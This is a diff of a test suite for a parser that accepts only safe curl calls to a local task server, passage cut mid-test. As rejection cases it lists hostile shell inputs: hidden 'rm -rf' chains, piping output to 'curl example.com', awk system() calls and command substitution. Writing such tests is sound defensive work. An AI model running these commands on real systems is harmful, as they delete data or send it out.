@@ -9,24 +9,24 @@ import {
 
 describe("parseIsomuxCurl", () => {
   test("simple GET task list", () => {
-    const req = parseIsomuxCurl("curl -s localhost:4000/tasks");
+    const req = parseIsomuxCurl("curl -s localhost:4000/api/tasks");
     expect(req).not.toBeNull();
     expect(req!.method).toBe("GET");
-    expect(req!.path).toBe("/tasks");
+    expect(req!.path).toBe("/api/tasks");
     expect(req!.action).toBe("List tasks");
     expect(req!.bodyFields).toBeNull();
     expect(req!.pipeTail).toBeNull();
   });
 
   test("GET with query string", () => {
-    const req = parseIsomuxCurl("curl -s localhost:4000/tasks?status=all");
-    expect(req!.path).toBe("/tasks?status=all");
+    const req = parseIsomuxCurl("curl -s localhost:4000/api/tasks?status=all");
+    expect(req!.path).toBe("/api/tasks?status=all");
     expect(req!.action).toBe("List tasks");
   });
 
   test("POST create task with JSON body", () => {
     const req = parseIsomuxCurl(
-      `curl -s -X POST localhost:4000/tasks -H 'Content-Type: application/json' -d '{"title":"Fix bug","createdBy":"Isomuxer1","priority":"P1"}'`,
+      `curl -s -X POST localhost:4000/api/tasks -H 'Content-Type: application/json' -d '{"title":"Fix bug","createdBy":"Isomuxer1","priority":"P1"}'`,
     );
     expect(req!.method).toBe("POST");
     expect(req!.action).toBe("Create task");
@@ -40,7 +40,7 @@ describe("parseIsomuxCurl", () => {
 
   test("multi-line continuation (backslash-newline)", () => {
     const req = parseIsomuxCurl(
-      `curl -s -X POST localhost:4000/tasks -H 'Content-Type: application/json' \\\n  -d '{"title":"X","createdBy":"Me"}'`,
+      `curl -s -X POST localhost:4000/api/tasks -H 'Content-Type: application/json' \\\n  -d '{"title":"X","createdBy":"Me"}'`,
     );
     expect(req).not.toBeNull();
     expect(req!.method).toBe("POST");
@@ -60,12 +60,12 @@ describe("parseIsomuxCurl", () => {
   test("claim and done task routes", () => {
     expect(
       parseIsomuxCurl(
-        `curl -s -X POST localhost:4000/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
+        `curl -s -X POST localhost:4000/api/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
       )!.action,
     ).toBe("Claim task");
     expect(
       parseIsomuxCurl(
-        `curl -s -X POST localhost:4000/tasks/28ab9400/done -d '{}'`,
+        `curl -s -X POST localhost:4000/api/tasks/28ab9400/done -d '{}'`,
       )!.action,
     ).toBe("Complete task");
   });
@@ -100,7 +100,7 @@ describe("parseIsomuxCurl", () => {
 
   test("non-JSON body falls back to bodyRaw", () => {
     const req = parseIsomuxCurl(
-      `curl -s -X POST localhost:4000/tasks -d 'title=hello&x=1'`,
+      `curl -s -X POST localhost:4000/api/tasks -d 'title=hello&x=1'`,
     );
     expect(req!.bodyFields).toBeNull();
     expect(req!.bodyRaw).toBe("title=hello&x=1");
@@ -108,7 +108,7 @@ describe("parseIsomuxCurl", () => {
 
   test("body with $VAR inside JSON is not valid JSON, kept raw", () => {
     const req = parseIsomuxCurl(
-      `curl -s -X POST localhost:4000/tasks -d "{\\"title\\": $TITLE}"`,
+      `curl -s -X POST localhost:4000/api/tasks -d "{\\"title\\": $TITLE}"`,
     );
     expect(req!.bodyFields).toBeNull();
     expect(req!.bodyRaw).toBe('{"title": $TITLE}');
@@ -116,10 +116,10 @@ describe("parseIsomuxCurl", () => {
 
   test("pipe tail is captured verbatim", () => {
     const req = parseIsomuxCurl(
-      `curl -s localhost:4000/tasks | jq '.[] | .title'`,
+      `curl -s localhost:4000/api/tasks | jq '.[] | .title'`,
     );
     expect(req).not.toBeNull();
-    expect(req!.path).toBe("/tasks");
+    expect(req!.path).toBe("/api/tasks");
     expect(req!.pipeTail).toBe(`| jq '.[] | .title'`);
   });
 
@@ -134,7 +134,7 @@ describe("parseIsomuxCurl", () => {
 
   test("multi-stage filter pipeline accepted", () => {
     const req = parseIsomuxCurl(
-      `curl -s localhost:4000/tasks | jq '.[] | .title' | head -5`,
+      `curl -s localhost:4000/api/tasks | jq '.[] | .title' | head -5`,
     );
     expect(req).not.toBeNull();
     expect(req!.pipeTail).toBe(`| jq '.[] | .title' | head -5`);
@@ -142,46 +142,50 @@ describe("parseIsomuxCurl", () => {
 
   test("pipe into python json.tool accepted", () => {
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | python3 -m json.tool"),
+      parseIsomuxCurl(
+        "curl -s localhost:4000/api/tasks | python3 -m json.tool",
+      ),
     ).not.toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | python3 evil.py"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | python3 evil.py"),
     ).toBeNull();
   });
 
   test("rejects pipe tails that aren't pure display filters", () => {
     // A second command hidden after the filter.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | cat; rm -rf /tmp/x"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | cat; rm -rf /tmp/x"),
     ).toBeNull();
     // Redirection in the tail.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | cat > /tmp/out"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | cat > /tmp/out"),
     ).toBeNull();
     // Command substitution in the tail.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | grep $(cat pattern)"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | grep $(cat pattern)"),
     ).toBeNull();
     // Non-filter commands (could have side effects / send data elsewhere).
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | curl example.com"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | curl example.com"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | xargs rm"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | xargs rm"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | tee /tmp/out"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | tee /tmp/out"),
     ).toBeNull();
     // Bare/empty pipe stages.
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks |")).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks | | cat")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks |")).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | jq '.' |"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | | cat"),
+    ).toBeNull();
+    expect(
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks | jq '.' |"),
     ).toBeNull();
     // awk is arbitrary code (system()), not on the allowlist.
     expect(
       parseIsomuxCurl(
-        `curl -s localhost:4000/tasks | awk 'BEGIN { system("touch /tmp/pwn") }'`,
+        `curl -s localhost:4000/api/tasks | awk 'BEGIN { system("touch /tmp/pwn") }'`,
       ),
     ).toBeNull();
   });
@@ -192,9 +196,9 @@ describe("parseIsomuxCurl", () => {
   // the displayed tail instead.
   test("accepts pipe tails of any length", () => {
     const longTail = `| jq '${"x".repeat(90)}'`;
-    const req = parseIsomuxCurl(`curl -s localhost:4000/tasks ${longTail}`);
+    const req = parseIsomuxCurl(`curl -s localhost:4000/api/tasks ${longTail}`);
     expect(req).not.toBeNull();
-    expect(req!.path).toBe("/tasks");
+    expect(req!.path).toBe("/api/tasks");
     expect(req!.pipeTail).toBe(longTail);
   });
 
@@ -216,11 +220,13 @@ describe("parseIsomuxCurl", () => {
     const pad = "x".repeat(90);
     expect(
       parseIsomuxCurl(
-        `curl -s localhost:4000/tasks | jq '.${pad}' | curl -X POST example.com -d @-`,
+        `curl -s localhost:4000/api/tasks | jq '.${pad}' | curl -X POST example.com -d @-`,
       ),
     ).toBeNull();
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks | awk '{print "${pad}"}'`),
+      parseIsomuxCurl(
+        `curl -s localhost:4000/api/tasks | awk '{print "${pad}"}'`,
+      ),
     ).toBeNull();
   });
 
@@ -246,7 +252,7 @@ describe("parseIsomuxCurl", () => {
 
     // Longer prefixes only shrink the raw budget, so they hold a fortiori.
     for (const prefix of [
-      "curl -s localhost:4000/tasks",
+      "curl -s localhost:4000/api/tasks",
       `curl -s -X POST localhost:4000/api/tasks -H "Authorization: Bearer $T"`,
     ]) {
       const r = parseIsomuxCurl(`${prefix} ${longTail}`);
@@ -273,26 +279,28 @@ describe("parseIsomuxCurl", () => {
       "| uniq /dev/stdin /tmp/pwn",
     ];
     for (const tail of cases) {
-      const req = parseIsomuxCurl(`curl -s localhost:4000/tasks ${tail}`);
+      const req = parseIsomuxCurl(`curl -s localhost:4000/api/tasks ${tail}`);
       expect(req).not.toBeNull();
       expect(req!.pipeTail).toBe(tail);
     }
   });
 
   test("http:// scheme and 127.0.0.1 accepted", () => {
-    expect(parseIsomuxCurl("curl http://localhost:4000/tasks")).not.toBeNull();
-    expect(parseIsomuxCurl("curl -s 127.0.0.1:4000/tasks")).not.toBeNull();
+    expect(
+      parseIsomuxCurl("curl http://localhost:4000/api/tasks"),
+    ).not.toBeNull();
+    expect(parseIsomuxCurl("curl -s 127.0.0.1:4000/api/tasks")).not.toBeNull();
   });
 
   test("attached short flag value (-XPOST) and clustered booleans (-sS)", () => {
     const req = parseIsomuxCurl(
-      `curl -sS -XPOST localhost:4000/tasks -d '{"title":"t"}'`,
+      `curl -sS -XPOST localhost:4000/api/tasks -d '{"title":"t"}'`,
     );
     expect(req!.method).toBe("POST");
   });
 
   test("--request=POST long form with equals", () => {
-    const req = parseIsomuxCurl("curl --request=POST localhost:4000/tasks");
+    const req = parseIsomuxCurl("curl --request=POST localhost:4000/api/tasks");
     expect(req!.method).toBe("POST");
   });
 
@@ -321,9 +329,9 @@ describe("parseIsomuxCurl", () => {
   });
 
   test("custom extra port accepted when passed", () => {
-    expect(parseIsomuxCurl("curl -s localhost:8080/tasks")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:8080/api/tasks")).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:8080/tasks", ["4000", "8080"]),
+      parseIsomuxCurl("curl -s localhost:8080/api/tasks", ["4000", "8080"]),
     ).not.toBeNull();
   });
 
@@ -332,51 +340,53 @@ describe("parseIsomuxCurl", () => {
   test("rejects non-isomux hosts and ports", () => {
     expect(parseIsomuxCurl("curl -s https://example.com/api")).toBeNull();
     expect(parseIsomuxCurl("curl -s localhost:5599/api/state")).toBeNull();
-    expect(parseIsomuxCurl("curl -s auntie:4000/tasks")).toBeNull();
+    expect(parseIsomuxCurl("curl -s auntie:4000/api/tasks")).toBeNull();
   });
 
   test("rejects non-curl commands", () => {
     expect(parseIsomuxCurl("ls -la")).toBeNull();
-    expect(parseIsomuxCurl("echo curl localhost:4000/tasks")).toBeNull();
+    expect(parseIsomuxCurl("echo curl localhost:4000/api/tasks")).toBeNull();
     expect(parseIsomuxCurl("")).toBeNull();
   });
 
   test("rejects compound commands and stderr file redirections", () => {
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks && echo done"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks && echo done"),
     ).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks; ls")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks; ls")).toBeNull();
     // Stdout-to-file is now accepted WITH the path surfaced on the card
     // (see the output-to-file suite); stderr-to-file still stays raw.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks 2> /tmp/err.log"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2> /tmp/err.log"),
     ).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks || true")).toBeNull();
+    expect(
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks || true"),
+    ).toBeNull();
   });
 
   test("accepts side-effect-free stream redirections", () => {
     // The transcript staples: discard stderr, discard stdout, merge streams.
     for (const cmd of [
-      "curl -s localhost:4000/tasks 2>/dev/null",
-      "curl -s localhost:4000/tasks 2> /dev/null",
-      "curl -s localhost:4000/tasks >/dev/null",
-      "curl -s localhost:4000/tasks 1>/dev/null",
-      "curl -s localhost:4000/tasks > /dev/null",
+      "curl -s localhost:4000/api/tasks 2>/dev/null",
+      "curl -s localhost:4000/api/tasks 2> /dev/null",
+      "curl -s localhost:4000/api/tasks >/dev/null",
+      "curl -s localhost:4000/api/tasks 1>/dev/null",
+      "curl -s localhost:4000/api/tasks > /dev/null",
     ]) {
       const req = parseIsomuxCurl(cmd);
       expect(req).not.toBeNull();
-      expect(req!.path).toBe("/tasks");
+      expect(req!.path).toBe("/api/tasks");
     }
     // 2>&1 composes with a display pipe (the real-world failing shape).
     const req = parseIsomuxCurl(
-      "curl -s localhost:4000/tasks 2>&1 | head -c 250",
+      "curl -s localhost:4000/api/tasks 2>&1 | head -c 250",
     );
     expect(req).not.toBeNull();
     expect(req!.pipeTail).toBe("| head -c 250");
     // Redirections inside tail stages are tolerated too.
     expect(
       parseIsomuxCurl(
-        "curl -s localhost:4000/tasks | python3 -m json.tool 2>/dev/null | head -5",
+        "curl -s localhost:4000/api/tasks | python3 -m json.tool 2>/dev/null | head -5",
       ),
     ).not.toBeNull();
   });
@@ -384,32 +394,34 @@ describe("parseIsomuxCurl", () => {
   test("rejects redirections beyond the safe set", () => {
     // Append, weird fds, fd-looking arguments, quoted fd digits.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks 2>>/dev/null"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>>/dev/null"),
     ).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks 2>&2")).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks >&1")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>&2")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks >&1")).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks abc2>/dev/null"),
-    ).toBeNull();
-    expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks '2'>/dev/null"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks abc2>/dev/null"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks 2>/dev/nullx"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks '2'>/dev/null"),
     ).toBeNull();
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks < /tmp/x")).toBeNull();
+    expect(
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>/dev/nullx"),
+    ).toBeNull();
+    expect(
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks < /tmp/x"),
+    ).toBeNull();
   });
 
   test("rejects command substitution", () => {
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks/$(cat id)/done"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks/$(cat id)/done"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks/`cat id`/done"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks/`cat id`/done"),
     ).toBeNull();
     expect(
       parseIsomuxCurl(
-        `curl -s -d "{\\"x\\": \\"$(whoami)\\"}" localhost:4000/tasks`,
+        `curl -s -d "{\\"x\\": \\"$(whoami)\\"}" localhost:4000/api/tasks`,
       ),
     ).toBeNull();
   });
@@ -417,13 +429,15 @@ describe("parseIsomuxCurl", () => {
   test("value-restricted options: /dev/null, dash, harmless write-out pass", () => {
     // Discard the response body (no file written).
     expect(
-      parseIsomuxCurl("curl -s -o /dev/null localhost:4000/tasks"),
+      parseIsomuxCurl("curl -s -o /dev/null localhost:4000/api/tasks"),
     ).not.toBeNull();
     expect(
-      parseIsomuxCurl("curl -s --output /dev/null localhost:4000/tasks"),
+      parseIsomuxCurl("curl -s --output /dev/null localhost:4000/api/tasks"),
     ).not.toBeNull();
     // Headers to stdout.
-    expect(parseIsomuxCurl("curl -s -D - localhost:4000/tasks")).not.toBeNull();
+    expect(
+      parseIsomuxCurl("curl -s -D - localhost:4000/api/tasks"),
+    ).not.toBeNull();
     // Status-code write-out, the standard probe idiom.
     const probe = parseIsomuxCurl(
       `curl -s -o /dev/null -w '%{http_code}' -X POST localhost:4000/api/agents/a1/diff -d '{}'`,
@@ -432,15 +446,15 @@ describe("parseIsomuxCurl", () => {
     expect(probe!.action).toBe("Show diff in chat");
     expect(
       parseIsomuxCurl(
-        `curl -s localhost:4000/tasks --write-out '%{http_code}'`,
+        `curl -s localhost:4000/api/tasks --write-out '%{http_code}'`,
       ),
     ).not.toBeNull();
     // But a dump-header file, or a write-out that touches files, rejects.
     expect(
-      parseIsomuxCurl("curl -s -D /tmp/headers localhost:4000/tasks"),
+      parseIsomuxCurl("curl -s -D /tmp/headers localhost:4000/api/tasks"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -w @fmt.txt`),
+      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -w @fmt.txt`),
     ).toBeNull();
   });
 
@@ -457,50 +471,56 @@ describe("parseIsomuxCurl", () => {
     ).toBeNull();
     // Credentials.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks -u admin:secret"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks -u admin:secret"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks --user admin:secret"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks --user admin:secret"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks -b session=abc"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks -b session=abc"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks --cookie s=1"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks --cookie s=1"),
     ).toBeNull();
     // Extra request headers via dedicated options.
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks -A myagent"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks -A myagent"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks -e http://x"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks -e http://x"),
     ).toBeNull();
     // write-out: %output{file} (curl >= 8.3.0) writes a file.
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -w '%output{/tmp/pwn}x'`),
+      parseIsomuxCurl(
+        `curl -s localhost:4000/api/tasks -w '%output{/tmp/pwn}x'`,
+      ),
     ).toBeNull();
   });
 
   test("only Content-Type and Authorization headers are admitted", () => {
     // Generic -H must not bypass the rejected credential/header flags.
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -H 'Cookie: session=abc'`),
-    ).toBeNull();
-    expect(
       parseIsomuxCurl(
-        `curl -s localhost:4000/tasks --header 'Cookie: session=abc'`,
+        `curl -s localhost:4000/api/tasks -H 'Cookie: session=abc'`,
       ),
     ).toBeNull();
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -H 'User-Agent: myagent'`),
+      parseIsomuxCurl(
+        `curl -s localhost:4000/api/tasks --header 'Cookie: session=abc'`,
+      ),
     ).toBeNull();
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -H 'X-Custom: 1'`),
+      parseIsomuxCurl(
+        `curl -s localhost:4000/api/tasks -H 'User-Agent: myagent'`,
+      ),
+    ).toBeNull();
+    expect(
+      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -H 'X-Custom: 1'`),
     ).toBeNull();
     // The two transcript-standard headers still pass (case-insensitive).
     expect(
       parseIsomuxCurl(
-        `curl -s localhost:4000/tasks -H 'content-type: application/json' --header "AUTHORIZATION: Bearer $T"`,
+        `curl -s localhost:4000/api/tasks -H 'content-type: application/json' --header "AUTHORIZATION: Bearer $T"`,
       ),
     ).not.toBeNull();
   });
@@ -508,28 +528,28 @@ describe("parseIsomuxCurl", () => {
   test("transport-neutral options remain accepted", () => {
     expect(
       parseIsomuxCurl(
-        "curl -s -m 5 --retry 2 --connect-timeout 3 localhost:4000/tasks",
+        "curl -s -m 5 --retry 2 --connect-timeout 3 localhost:4000/api/tasks",
       ),
     ).not.toBeNull();
   });
 
   test("rejects unknown flags and multiple URLs", () => {
     expect(
-      parseIsomuxCurl("curl --weird-flag localhost:4000/tasks"),
+      parseIsomuxCurl("curl --weird-flag localhost:4000/api/tasks"),
     ).toBeNull();
-    expect(parseIsomuxCurl("curl -Z localhost:4000/tasks")).toBeNull();
+    expect(parseIsomuxCurl("curl -Z localhost:4000/api/tasks")).toBeNull();
     expect(
       parseIsomuxCurl("curl localhost:4000/a localhost:4000/b"),
     ).toBeNull();
   });
 
   test("rejects unescaped multi-line commands", () => {
-    expect(parseIsomuxCurl("curl -s localhost:4000/tasks\nls")).toBeNull();
+    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks\nls")).toBeNull();
   });
 
   test("rejects unterminated quotes", () => {
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks -d '{"title":`),
+      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -d '{"title":`),
     ).toBeNull();
   });
 
@@ -640,19 +660,19 @@ describe("parseIsomuxCurl jq producer pipelines", () => {
     // No -d @- on the curl: jq output is discarded.
     expect(
       parseIsomuxCurl(
-        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/tasks -d '{"title":"x"}'`,
+        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/api/tasks -d '{"title":"x"}'`,
       ),
     ).toBeNull();
     // --data-raw does not interpret @, so @- is a literal, not stdin.
     expect(
       parseIsomuxCurl(
-        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/tasks --data-raw @-`,
+        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/api/tasks --data-raw @-`,
       ),
     ).toBeNull();
     // -G diverts data to the query string.
     expect(
       parseIsomuxCurl(
-        `jq -n '{text: "hi"}' | curl -s -G localhost:4000/tasks -d @-`,
+        `jq -n '{text: "hi"}' | curl -s -G localhost:4000/api/tasks -d @-`,
       ),
     ).toBeNull();
   });
@@ -685,7 +705,9 @@ describe("parseIsomuxCurl jq producer pipelines", () => {
   });
 
   test("standalone curl -d @- keeps its old raw-body rendering", () => {
-    const req = parseIsomuxCurl(`curl -s -X POST localhost:4000/tasks -d @-`);
+    const req = parseIsomuxCurl(
+      `curl -s -X POST localhost:4000/api/tasks -d @-`,
+    );
     expect(req).not.toBeNull();
     expect(req!.bodyRaw).toBe("@-");
     expect(req!.bodyNote).toBeNull();
@@ -1017,7 +1039,7 @@ describe("parseIsomuxCurl curl-fed heredoc body", () => {
     // Inline -d content alongside the heredoc: stdin is unread.
     expect(
       parseIsomuxCurl(
-        `curl -s -X POST localhost:4000/tasks -d '{"title":"x"}' <<'EOF'\nignored\nEOF`,
+        `curl -s -X POST localhost:4000/api/tasks -d '{"title":"x"}' <<'EOF'\nignored\nEOF`,
       ),
     ).toBeNull();
   });
@@ -1026,7 +1048,7 @@ describe("parseIsomuxCurl curl-fed heredoc body", () => {
     // curl treats @ literally under --data-raw; the heredoc is never the body.
     expect(
       parseIsomuxCurl(
-        `curl -s -X POST localhost:4000/tasks --data-raw @- <<'EOF'\n{"title":"x"}\nEOF`,
+        `curl -s -X POST localhost:4000/api/tasks --data-raw @- <<'EOF'\n{"title":"x"}\nEOF`,
       ),
     ).toBeNull();
   });
@@ -1034,13 +1056,13 @@ describe("parseIsomuxCurl curl-fed heredoc body", () => {
   test("two @- body args stay raw", () => {
     expect(
       parseIsomuxCurl(
-        `curl -s -X POST localhost:4000/tasks -d @- -d @- <<'EOF'\n{"a":1}\nEOF`,
+        `curl -s -X POST localhost:4000/api/tasks -d @- -d @- <<'EOF'\n{"a":1}\nEOF`,
       ),
     ).toBeNull();
   });
 
   test("out-of-grammar heredocs feeding curl stay raw", () => {
-    const HC = `curl -s -X POST localhost:4000/tasks -d @-`;
+    const HC = `curl -s -X POST localhost:4000/api/tasks -d @-`;
     // herestring
     expect(parseIsomuxCurl(`${HC} <<<'{"a":1}'`)).toBeNull();
     // tab-stripping
@@ -1070,14 +1092,18 @@ describe("parseIsomuxCurl curl-fed heredoc body", () => {
 
 describe("describeIsomuxRoute", () => {
   test("matches with query strings and trailing slashes", () => {
-    expect(describeIsomuxRoute("GET", "/tasks?status=all")).toBe("List tasks");
-    expect(describeIsomuxRoute("GET", "/tasks/")).toBe("List tasks");
+    expect(describeIsomuxRoute("GET", "/api/tasks?status=all")).toBe(
+      "List tasks",
+    );
+    expect(describeIsomuxRoute("GET", "/api/tasks/")).toBe("List tasks");
     expect(describeIsomuxRoute("GET", "/api/tasks")).toBe("List tasks");
   });
 
   test("wildcards match exactly one segment", () => {
-    expect(describeIsomuxRoute("POST", "/tasks/abc/claim")).toBe("Claim task");
-    expect(describeIsomuxRoute("POST", "/tasks/a/b/claim")).toBeNull();
+    expect(describeIsomuxRoute("POST", "/api/tasks/abc/claim")).toBe(
+      "Claim task",
+    );
+    expect(describeIsomuxRoute("POST", "/api/tasks/a/b/claim")).toBeNull();
   });
 
   test("method must match", () => {
@@ -1156,7 +1182,7 @@ describe("humanizeIsomuxRequest", () => {
 
   test("task claim includes id and assignee", () => {
     const req = parse(
-      `curl -s -X POST localhost:4000/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
+      `curl -s -X POST localhost:4000/api/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
     );
     expect(humanizeIsomuxRequest(req)).toBe(
       "Claim task 28ab9400 for Isomuxer1",
@@ -1164,11 +1190,13 @@ describe("humanizeIsomuxRequest", () => {
   });
 
   test("task list variants by status param", () => {
-    expect(humanizeIsomuxRequest(parse("curl -s localhost:4000/tasks"))).toBe(
-      "List open tasks",
-    );
     expect(
-      humanizeIsomuxRequest(parse("curl -s 'localhost:4000/tasks?status=all'")),
+      humanizeIsomuxRequest(parse("curl -s localhost:4000/api/tasks")),
+    ).toBe("List open tasks");
+    expect(
+      humanizeIsomuxRequest(
+        parse("curl -s 'localhost:4000/api/tasks?status=all'"),
+      ),
     ).toBe("List all tasks");
   });
 
@@ -1195,39 +1223,43 @@ describe("agent discovery route label", () => {
 describe("parseIsomuxCurl output-to-file", () => {
   test("stdout redirect to a plain path parses and surfaces the path", () => {
     const req = parseIsomuxCurl(
-      "curl -s localhost:4000/tasks > /tmp/tasks.json",
+      "curl -s localhost:4000/api/tasks > /tmp/tasks.json",
     );
     expect(req).not.toBeNull();
-    expect(req!.path).toBe("/tasks");
+    expect(req!.path).toBe("/api/tasks");
     expect(req!.outputFile).toBe("/tmp/tasks.json");
     expect(req!.outputAppend).toBe(false);
   });
 
   test("no-space and fd-1 forms parse", () => {
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks >/tmp/t.json")!.outputFile,
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks >/tmp/t.json")!
+        .outputFile,
     ).toBe("/tmp/t.json");
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks 1> /tmp/t.json")!
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks 1> /tmp/t.json")!
         .outputFile,
     ).toBe("/tmp/t.json");
   });
 
   test("append redirect parses with outputAppend", () => {
-    const req = parseIsomuxCurl("curl -s localhost:4000/tasks >> /tmp/log.txt");
+    const req = parseIsomuxCurl(
+      "curl -s localhost:4000/api/tasks >> /tmp/log.txt",
+    );
     expect(req!.outputFile).toBe("/tmp/log.txt");
     expect(req!.outputAppend).toBe(true);
   });
 
   test("-o / --output with a real path parses and surfaces the path", () => {
     const req = parseIsomuxCurl(
-      "curl -s -o /tmp/out.json localhost:4000/tasks",
+      "curl -s -o /tmp/out.json localhost:4000/api/tasks",
     );
     expect(req!.outputFile).toBe("/tmp/out.json");
     expect(req!.outputAppend).toBe(false);
     expect(
-      parseIsomuxCurl("curl -s --output /tmp/out.json localhost:4000/tasks")!
-        .outputFile,
+      parseIsomuxCurl(
+        "curl -s --output /tmp/out.json localhost:4000/api/tasks",
+      )!.outputFile,
     ).toBe("/tmp/out.json");
   });
 
@@ -1241,7 +1273,7 @@ describe("parseIsomuxCurl output-to-file", () => {
 
   test("silent /dev/null tolerances are unchanged (no outputFile)", () => {
     const req = parseIsomuxCurl(
-      "curl -s -o /dev/null localhost:4000/tasks 2>/dev/null",
+      "curl -s -o /dev/null localhost:4000/api/tasks 2>/dev/null",
     );
     expect(req).not.toBeNull();
     expect(req!.outputFile).toBeNull();
@@ -1250,34 +1282,38 @@ describe("parseIsomuxCurl output-to-file", () => {
   test("conservative bails: stderr-to-file, two outputs, odd paths, pipe combo", () => {
     // stderr to a file stays raw
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks 2> /tmp/err.log"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2> /tmp/err.log"),
     ).toBeNull();
     // two output targets stays raw
     expect(
       parseIsomuxCurl(
-        "curl -s -o /tmp/a.json localhost:4000/tasks > /tmp/b.json",
+        "curl -s -o /tmp/a.json localhost:4000/api/tasks > /tmp/b.json",
       ),
     ).toBeNull();
     // path with characters outside the allowlist stays raw
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks > '/tmp/my file.json'"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks > '/tmp/my file.json'"),
     ).toBeNull();
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks > /tmp/$(id).json"),
+      parseIsomuxCurl("curl -s localhost:4000/api/tasks > /tmp/$(id).json"),
     ).toBeNull();
     // file output combined with a display pipe stays raw
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks > /tmp/t.json | jq '.'"),
+      parseIsomuxCurl(
